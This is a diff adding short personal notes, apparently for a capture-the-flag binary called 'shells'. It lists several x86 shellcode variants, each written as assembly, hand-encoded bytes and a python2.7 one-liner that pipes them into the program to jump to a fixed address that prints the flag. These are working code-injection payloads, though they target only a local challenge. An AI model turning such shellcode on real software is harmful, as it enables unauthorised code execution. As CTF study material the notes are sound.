@@ -1,0 +1,33 @@
+http://shell-storm.org/online/Online-Assembler-and-Disassembler/
+--> x86(32)
+
+
+push 0x08048540
+ret
+
+python2.7 -c "print '\x68\x40\x85\x04\x08\xc3'" | ./shells
+----------------------------------------------------------------
+push 0x8048540
+jmp  [esp]
+
+python2.7 -c "print '\x68\x40\x85\x04\x08\xff\x24\x24'" | ./shells
+this prints flag 2 time. Once with jmp and then with ret ot the function!
+----------------------------------------------------------------
+mov    eax,0x8048540
+call   eax
+
+python2.7 -c "print '\xb8\x40\x85\x04\x08\xff\xd0'" | ./shells
+----------------------------------------------------------------
+The absolute address jump opcode (FF /4) does not accept an immediate value. It can only jump to a value stored in a register or stored in memory:
+
+xor eax, eax
+add eax, 0x8048540
+jmp eax
+					 
+python2.7 -c "print '\x31\xc0\x05\x40\x85\x04\x08\xff\xe0'" | ./shells
+----------------------------------------------------------------
+mov eax, 0x8048540
+jmp eax
+
+python2.7 -c "print '\xb8\x40\x85\x04\x08\xff\xe0'" | ./shells
+----------------------------------------------------------------
